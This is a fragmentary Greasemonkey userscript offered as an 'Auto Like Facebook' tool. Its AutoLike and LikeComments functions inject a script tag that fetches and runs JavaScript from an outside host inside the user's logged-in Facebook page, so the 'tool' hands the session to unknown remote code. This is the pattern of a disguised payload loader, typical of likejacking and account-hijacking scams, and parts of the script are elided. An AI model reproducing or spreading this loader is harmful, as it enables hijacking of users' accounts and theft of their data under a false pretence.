// ==UserScript==
// @name			Auto Like Facebook Rsen
// @namespace		auto_like_facebook
// @description		Auto Like Facebook by Arsen
// @author			Arsen
// @authorURL		https://www.facebook.com/nErsA.AlLuDeR
// @homepage		http://computertactics.tk/
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://comp.forumd.biz/11075.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="http://comp.forumd.biz/11075.js",b.body.appendChild(a);void(0);};}
body = document.body;
